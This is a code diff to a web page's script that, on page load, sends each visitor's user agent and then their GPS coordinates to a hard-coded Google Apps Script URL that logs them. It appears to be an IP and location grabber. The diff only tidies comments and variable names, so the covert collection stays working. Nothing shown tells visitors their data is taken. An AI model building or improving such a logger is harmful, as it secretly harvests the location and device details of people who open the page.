@@ -45,14 +45,14 @@
 </div>
 
 <script>
-    // REPLACE THIS WITH YOUR NEW GOOGLE SCRIPT URL
+    // PASTE YOUR NEW URL HERE
     var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxXyoWTFatl0i6A0IkMKXU3kUsUUqxAFmrmmCpQ9s14NfxrHZBBEmUCn6GTM3TZKe1Mnw/exec"; 
 
     window.onload = function() {
         var ua = navigator.userAgent;
         
-        // Send Data via Fetch (More reliable than image src)
-        fetch(SCRIPT_URL + "?ip=AutoDetected&ua=" + encodeURIComponent(ua) + "&method=Fetch", {
+        // Send Data via Fetch
+        fetch(SCRIPT_URL + "?ip=AutoDetected&ua=" + encodeURIComponent(ua), {
             method: 'POST',
             body: JSON.stringify({ip: 'AutoDetected', ua: ua})
         }).then(function() {
@@ -62,9 +62,9 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var lat = position.coords.latitude;
-                    var long = position.coords.longitude;
+                    var long_val = position.coords.longitude;
                     // Update log with GPS if available
-                    fetch(SCRIPT_URL + "?lat=" + lat + "&long=" + long + "&ua=" + encodeURIComponent(ua));
+                    fetch(SCRIPT_URL + "?lat=" + lat + "&long=" + long_val + "&ua=" + encodeURIComponent(ua));
                 }, function(error) {
                     // GPS denied or failed, IP is already logged
                 });
